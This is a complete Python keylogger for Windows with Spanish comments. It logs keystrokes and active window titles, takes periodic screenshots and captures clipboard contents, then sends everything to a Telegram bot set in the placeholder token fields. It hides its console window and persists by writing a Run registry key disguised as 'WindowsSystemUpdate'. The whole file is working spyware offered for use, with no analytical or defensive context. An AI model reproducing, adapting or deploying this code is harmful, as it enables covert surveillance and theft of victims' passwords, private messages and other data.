import time
import datetime
import threading
import requests
import os
import sys
import win32clipboard
import pyautogui
import win32gui
import winreg as reg
import ctypes
from pynput import keyboard

# ================== CONFIGURACIÓN ==================
TELEGRAM_TOKEN = "PEGA_AQUI_TU_TOKEN_DEL_BOTFATHER"
CHAT_ID = "PEGA_AQUI_TU_CHAT_ID"

SEND_INTERVAL = 8
SCREENSHOT_INTERVAL = 30   # Cada cuántos segundos toma foto
# ===================================================

log_buffer = ""
last_send = time.time()
last_screenshot = time.time()
lock = threading.Lock()

def add_to_startup():
    try:
        exe_path = sys.executable
        script_path = os.path.abspath(__file__)
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsSystemUpdate", 0, reg.REG_SZ, f'"{exe_path}" "{script_path}"')
        reg.CloseKey(key)
    except:
        pass

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)[:60]  # Limitar longitud
    except:
        return "Unknown"

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data
    except:
        return None

def send_to_telegram(message, photo=None):
    try:
        if photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': open(photo, 'rb')}
            data = {"chat_id": CHAT_ID, "caption": message[:500]}
            requests.post(url, data=data, files=files, timeout=15)
            os.remove(photo)
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
            requests.post(url, json=data, timeout=10)
    except:
        pass

def take_screenshot():
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        pyautogui.screenshot(filename)
        return filename
    except:
        return None

def on_press(key):
    global log_buffer, last_send
    
    try:
        char = key.char if hasattr(key, 'char') and key.char is not None else f"[{str(key).replace('Key.', '').upper()}]"
    except:
        char = "[UNKNOWN]"

    window = get_active_window()
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"[{timestamp}] [{window}] {char}\n"

    with lock:
        log_buffer += entry

        if (time.time() - last_send > SEND_INTERVAL) or (len(log_buffer) > 900):
            if log_buffer.strip():
                msg = f"<b>🔴 KEYLOGGER ACTIVO</b>\nPC: {os.getenv('COMPUTERNAME')}\nHora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n{log_buffer}"
                threading.Thread(target=send_to_telegram, args=(msg,), daemon=True).start()
                log_buffer = ""
                last_send = time.time()

def screenshot_thread():
    global last_screenshot
    while True:
        if time.time() - last_screenshot >= SCREENSHOT_INTERVAL:
            photo = take_screenshot()
            if photo:
                caption = f"📸 Captura - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                threading.Thread(target=send_to_telegram, args=(caption, photo), daemon=True).start()
            last_screenshot = time.time()
        time.sleep(5)

def clipboard_thread():
    last_clip = ""
    while True:
        clip = get_clipboard()
        if clip and clip != last_clip and len(str(clip)) > 3:
            last_clip = clip
            msg = f"<b>📋 PORTAPAPELES</b>\n\n{clip}"
            threading.Thread(target=send_to_telegram, args=(msg,), daemon=True).start()
        time.sleep(4)

# ================== INICIO ==================
if __name__ == "__main__":
    # Ocultar la ventana de consola
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    add_to_startup()

    print("KEYLOGGER NUCLEAR INICIADO (Oculto)")

    # Iniciar hilos
    threading.Thread(target=screenshot_thread, daemon=True).start()
    threading.Thread(target=clipboard_thread, daemon=True).start()

    # Iniciar keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
